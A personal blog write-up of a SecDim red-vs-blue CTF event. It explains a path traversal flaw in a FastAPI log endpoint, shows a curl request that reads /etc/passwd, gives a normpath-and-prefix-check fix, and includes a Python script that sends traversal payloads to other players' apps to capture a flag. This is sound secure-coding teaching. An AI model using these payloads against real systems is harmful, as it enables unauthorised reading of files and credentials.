---
title: "Secgames 06"
date: 2023-05-27T18:48:46+09:30
draft: false
---

### SecGames - File.hth
Secgames is a regular Meetup event hosted by the team at SecDim, the goal is to promote secure coding techniques and foster a community of secure programmers. 
The challenge for this event was slightly different as it was designed in a red vs blue team CTF style where we have both the role of 
patching the vulnerable application before gaining the ability to attack other players patched applications.  
<!--more-->  
&nbsp;

![Secgames](/blog/secdim/secgames/secgames_06/img/secgames.webp)  
Hosted by [**SecDim**](https://secdim.com/)  
&nbsp;  

### How it Will Work
After we receive the link to this evenings challenge in the events group chat, we can clone the repository locally and can proceed to build & run the Dockerized application using make to perform analysis and inspect the code.
We will then identify an appropriate security fix and implement it into the challenge application, performing further test's to validate that the vulnerability has been successfully patched and application is performing as expected.
Upon pushing our security fix and the application passing the usability tests on the server, we will receive the link(s) to other players patched applications and authorised to attempt to break their patched application.  
&nbsp;

### The Application
**Running the Application**  
```
m477@Coding:~/Documents/Secdim/file-py.hth$ sudo make run
-e 
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%              %%%%%%%%%%%%
   %%%%%%%%%%%                  ,%%%%%%%%%%
   %%%%%%%%%%         *%%%%*    %%%%%%%%%%%
   %%%%%%%%%%        %%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%             *%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%               .%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%            %%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%        %%%%%%%%%
   %%%%%%%%%%      .%%%%.         %%%%%%%%%
   %%%%%%%%%%                   .%%%%%%%%%%
   %%%%%%%%%%%%,             ,%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
              play.secdim.com
-e 
[i] Building the program

Sending build context to Docker daemon  135.7kB
Step 1/8 : FROM secdim/play-py:api
 ---> abd57c030435
Step 2/8 : LABEL vendor="SecDim"     copyright="Security Dimension Pty Ltd. All rights reserved"     description="SecDim Python Challenge"     version="2.0.0"
....
SNIP
....
[i] Done! Program is ready to run

INFO:     Started server process [1]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
```
Run the application using Make.  

**Taking a Look**  
A relatively simple Python3 FastAPI application that has 3 available endpoints:  
**Root**  
![Root Endpoint](/blog/secdim/secgames/secgames_06/img/root.png)  
Navigating to the root endpoint 

**Docs**  
![Swagger](/blog/secdim/secgames/secgames_06/img/swagger.png)  


**Log Endpoint**  
![Swagger - Log](/blog/secdim/secgames/secgames_06/img/swagger_log.png)
From the Swagger documentation we can see that the log enpdoint only accepts POST requests that contain parameters supplied in a valid JSON data structure. 
The parameters are:  

```
{
	  "name": "daemon.log",
	  "subdir": "system/"
	
}
```
The expected parameters:  
- name: A filename to read.  
- subdir: The subdirectory where the file resides.  

```
@app.post("/log")

def read_log(log: Log):

    """
       Returns content of the log file in logs directory and
        sub-directories
    """
    try:
        content = open(os.path.join(PREFIX_DIR, log.subdir, log.name), "r")
        return {"name": log.name, "content": content.read()}
    except Exception as ex:
        raise HTTPException(status_code=404, detail="Log not found")
```
Upon receiving a post request the application will join the supplied subdirectory & filename into a filepath and will attempt to read the file, the contents will be returned as text string with the response.  

```
m477@Coding:~$ curl -X 'POST' 'http://0.0.0.0:8080/log' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"subdir": "system/", "name": "daemon.log"}'
{"name":"daemon.log","content":"[2021-09-01 14:20:20] sshd started\n[2021-10-01 14:20:20] dockerd failed\n"}
```
This is the expected output we should receive when reading the 'daemon.log' file stored in the 'system' subdirectory.  

&nbsp;  

### Vulnerability / CWE
In its current state, the application recieves input from the user from a Post request, joins the filepath with the 'os.path.join()' function  and passes it directly to the Python's 'open()' function. 
This results in an adversary being able to traverse the directory structure of the Docker container and able to read practically any file within the Docker container.  

**CWE-35 - Path Traversal: '.../...//'**  
"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '.../...//' (doubled triple dot slash) sequences that can resolve to a location that is outside of that directory." - Mitre  

More info: [Mitre - CWE-35](https://cwe.mitre.org/data/definitions/35.html)  

**CWE-23 - Relative Path Traversal**  
"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as ".." that can resolve to a location that is outside of that directory." - Mitre  

More info: [Mitre - CWE-23](https://cwe.mitre.org/data/definitions/23.html)  

**Example**  
```
 curl -X 'POST' 'http://0.0.0.0:8080/log' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"subdir": "system/../../../etc/", "name": "passwd"}'
{"name":"passwd","content":"root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\n"}
```
By traversing directories I have read the 'passwd' file stored in the '/etc/' directory of the Docker container.  
&nbsp;

### Security Fix
To effectively patch the path traversal vulnerability we need to join the path segments together and resolve any redundant seperators before checking that the filepath starts with the prefix directory.   

The default operation of the 'os.path.join' function when supplied with an absolute path any previous segments are ignored. For instance, if our application receives an absolute path as the filename parameter, the subdir parameter and constant value of the log subdirectory path would be ignored and the absolute path received would be handled by the 'open()' function. 
This would directly result in being able to access files outside the log directory, therefore we need to get the full resolved path and conduct the prefix check to ensure that only files in the logs subdirectory can be accessed.  
[OS Path Documentation - Join](https://docs.python.org/3.10/library/os.path.html#os.path.join)


**Log Enpoint Implementation**  
```
@app.post("/log")
def read_log(log: Log):
    """
    Returns content of the log file in logs directory and
    sub-directories
    """    
    # Join the filepath segments and normalise to resolve any traversal techniques 
    filepath = os.path.normpath(os.path.join(PREFIX_DIR, log.subdir, log.name))   

    # Check that the resolved path starts with the prefix directory 
    if not filepath.startswith(PREFIX_DIR):
        return HTTPException(status_code=403, detail="Forbidden: Path Traversal!")

    try:
        with open(filepath, "r") as content:
            return {"name": log.name, "content": content.read()}

    except Exception as ex:
        raise HTTPException(status_code=404, detail="Log not found"
```
This is how I implemented the additional checks into the existing 'read_log' function. 

Some examples:  

1. AbsPath as filename {'name': '/etc/passwd'} => This will remain intact through the path join and normalisation assignment but will fail the prefix check.  

2. Traversal in filename {'name': '../flag.log'} => The "../" will be resolved taking us back a level on the directory tree with the path being "/app/src/flag.log". This will fail the prefix check as it is does not start with "/app/src/logs".  
&nbsp;


**Constant Values, Imports, etc...**  
```
PREFIX_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
```
For reference, here is the prefix directory stored as a constant value.  

**Testing**
```
m477@Coding:~/Documents/Secdim/file-py.hth$ sudo make test
-e 
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%              %%%%%%%%%%%%
   %%%%%%%%%%%                  ,%%%%%%%%%%
   %%%%%%%%%%         *%%%%*    %%%%%%%%%%%
   %%%%%%%%%%        %%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%             *%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%               .%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%            %%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%        %%%%%%%%%
   %%%%%%%%%%      .%%%%.         %%%%%%%%%
   %%%%%%%%%%                   .%%%%%%%%%%
   %%%%%%%%%%%%,             ,%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
              play.secdim.com
-e 
[i] Building the program
....
SNIP
....
Successfully tagged secdim.lab.python:latest
-e 
[i] Done! Program is ready to run

-e 
[i] Running functionality tests

============================= test session starts ==============================
platform linux -- Python 3.11.2, pytest-7.2.1, pluggy-1.0.0
rootdir: /app
plugins: anyio-3.6.2
collected 4 items
test_usability.py ....                                                   [100%]
========================= 4 passed, 1 warning in 1.09s =========================

-e 
[i] Well done! All functionality tests have been passed
```
Performing the local usability tests.  

**Testing if we can still travese directories**
```
m477@Coding:~$ curl -X 'POST' 'http://0.0.0.0:8080/log' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"subdir": "system/../../../etc/", "name": "passwd"}'
{"status_code":403,"detail":"Forbidden: Path Traversal!","headers":null}
```
Using the standard path traversal technique.  

```
m477@Coding:~$ curl -X 'POST' 'http://0.0.0.0:8080/log' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"subdir": "", "name": "/etc/passwd"}'
{"status_code":403,"detail":"Path Traversal!","headers":null}
```
Supplying an absolute path as filename.  

**Push Changes**  
![Git Commit & Push](/blog/secdim/secgames/secgames_06/img/git_push.png)  
Commit the changes and push the repository to the test server.  

![Pass Usability](/blog/secdim/secgames/secgames_06/img/passed.png)  
Here the server checks the patched application for default functionality and usability. There were no security tests performed for this challenge as that will be undertaken by other players in the next stage. On this occasion, a flag was copied into the container and the application was published.  
&nbsp;  

### Attacking Others
At this point the event has finished and time is getting on. Many players have already pushed their patched applications, flags have been captured and applications re-patched. 

![Attack Page](/blog/secdim/secgames/secgames_06/img/attack_page.png)
This screenshot was taken 2 days after the event and players are still pushing their fixes, the blue ribbon and trohpy in the top left corner of the player card indicate I have successfully captured the flag from their application instance.  

![Flag Hint](/blog/secdim/secgames/secgames_06/img/flag_hint.png)
By clicking on the hint, we are provided with the location of the flag.  

**Path Traversal Payloads**
To begin we will have to identify some payloads that we can use to attempt to break other players applications. Starting out with a Google search we end with a popular Github repository that contains useful payloads and bypasses for all thing web application security. 
[PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)  
![Basic Exploitation](/blog/secdim/secgames/secgames_06/img/github_path_traversal.png)  
The repository contains numerous payloads and techniques that can be used to bypass or defeat checks for path traversal character sequences.  

**Let's Hack**  
Armed with a list of possible payloads, lets attempt to break other players path traversal patches using a short Python script.  

```
payloads = ['/app/flag.log', '../flag.log', '....SNIP....'']
HEADERS = {'accept': 'application/json', 'Content-Type': 'application/json'}

for url in urls:
    print(f"\nTrying: {url}")
    for payload in payloads:
        sleep(0.75)
        s = requests.session()
        s.headers.update(HEADERS)
        rsp = s.post(url, json={'name': f'{payload}', 'subdir': ''})
        print(f"\nPayload: {payload} \n\tRSP: {rsp.text}")

```
The core function of the script, simply iterating through a list of the target urls and list of approximately 20 path traversal payloads including unicode confusables as both the 'subdir' and 'name' parameters.  

```
m477@Coding:~/Python/Path_Trav$ python3 hack.py 

Trying: https://alice-file-py-hth-**********-uc.a.run.app/log
Payload: /app/flag.log
    RSP: {"name":"/app/flag.log","content":"SecDim{f10e9b4aac288ca2932e4e490294c7e3}\n"}
....
SNIP
....
```
Response received from target, you can see in the content there is a flag.  

**Challenge Scoreboard**  
![Challenge Scoreboard](/blog/secdim/secgames/secgames_06/img/leaderboard.png)  
Being a red vs blue challenge we can view the current player points on the scoreboard.  
&nbsp;  

Join the Meetup group here: [Meetup - Secgames](https://www.meetup.com/secgames/)  
&nbsp;  

--> Apologies for alternating between screenshots and code-blocks in this document...  
